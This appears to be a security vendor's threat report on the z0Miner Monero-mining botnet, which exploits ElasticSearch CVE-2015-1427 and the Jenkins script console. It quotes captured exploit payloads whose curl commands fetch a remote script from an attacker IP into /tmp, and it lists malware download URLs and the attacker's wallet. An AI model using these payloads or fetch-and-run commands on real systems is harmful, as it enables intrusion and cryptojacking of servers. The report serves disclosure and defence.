8 March 2021 / Botnet

Overview
In recent months, with the huge rise of Bitcoin and Monroe, various mining botnet have
kicked into high gear, and our BotMon system detects dozens of mining Botnet attacks pretty
much every day, most of them are old families, some just changed their wallets or
propagation methods, and z0Miner is one of them.
z0Miner is a malicious mining family that became active last year and has been publicly
analyzed by the Tencent Security Team. z0Miner was initially active when it exploited the
Weblogic unauthorized remote command execution vulnerability for propagation.
Recently, our Anglerfish honeypot system captured that z0Miner was also spreading by
exploiting remote command execution vulnerabilities in ElasticSearch and Jenkins, with the
following recent active trends.

Vulnerability exploit
ElasticSearch RCE vulnerability CVE-2015-1427
Although it is an old vulnerability from 2015, z0Miner is still using it. The vulnerability exploit
Payload is as follows (key details have been omitted).

1/4

POST /{VULN_URI} HTTP/1.1
Host: {target}:{port}
{...exec(\"curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\")...}

Jenkins script console RCE vulnerability
This vulnerability was exposed a bit earlier than CVE-2015-1427 above, and the
corresponding z0Miner Payload is
POST /{VULN_URI} HTTP/1.1
Host: {target}:{port}
curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+o+%2Ftmp%2Fsolr%22.execute%28%29.text&json=%7B%22script%22%3A+%22println+%5C%22curl+fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&Submit=Run

Sample Analysis
Initial Shell Script
The core logic of the Payloads exploited by the above two vulnerabilities is to download
hxxp://27.1.1.34:8080/docs/conf.txt and execute it. This file is a malicious shell
script that corresponds to z0Miner's earlier z0.txt. The logic is essentially the same as in the
earlier z0.txt
1. Kill the competitor
2. Setting up Cron
3. Download & execute the mining programs

Cron
As in the early days, z0Miner will still download and execute malicious scripts on Pastebin
periodically by setting up Cron tasks, the latest malicious script URLs are as follows.
hxxps://pastebin.com/raw/4rb51qKW
hxxps://pastebin.com/raw/bwD1BCXt

Currently, the script downloaded from the above URL only contains an exit command, and
more malicious actions probably will be added in the future.

Mining
After killing competitors and setting up crontab, conf.txt will download the mining kit from the
following 3 URLs and start mining.

2/4

hxxp://27.1.1.34:8080/docs/config.json
hxxp://178.62.202.152:8080/Wuck/java.exe
hxxp://27.1.1.34:8080/docs/solr.sh

--> Mining Config file
--> XMRig Miner
--> Miner Starter Shell script file

The solr.sh file is a shell script file dedicated to killing more competitors and starting the
mining program.
The XMR Wallet in the config.json file differs from the earlier z0Miner Wallet:
49r6Mp1fcb4fUT5FPTgaz9E47fZV7n6JiY76c4vdBZvgDm8GmWHTVYM9Azpe4MsA9oXs2RpUNPPfH7oXABr3Qn

And now reads over 22 XMRs have been mined so far.
